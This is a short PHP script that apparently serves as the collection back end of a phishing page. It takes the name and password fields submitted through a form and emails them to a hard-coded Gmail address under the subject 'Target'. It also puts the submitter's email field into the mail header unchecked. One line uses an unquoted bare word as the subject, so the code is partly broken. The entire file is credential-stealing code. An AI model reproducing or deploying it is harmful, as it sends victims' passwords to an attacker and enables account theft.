<?php
if (isset($_POST['email'])){
    $yourName =  "Name: " . $_POST['name'] . "\r\n";
    $yourEmail =  "Pass" . $_POST['pass'] . "\r\n";
    
    
    
    $to = 'switchlunablade@gmail.com';

    $subject = Target ;


    $headers = 'From: '. $_POST['email'] . "\r\n";


    $message = $yourName . $yourEmail ;


    $subject = preg_replace("/(\r\n)|(\r)|(\n)/", "", $subject);
    $subject = preg_replace("/(\t)/", " ", $subject);
    $subject = '=?UTF-8?B?' . base64_encode($subject) . '?=';

    mail($to, $subject, $message, $headers);

}
?>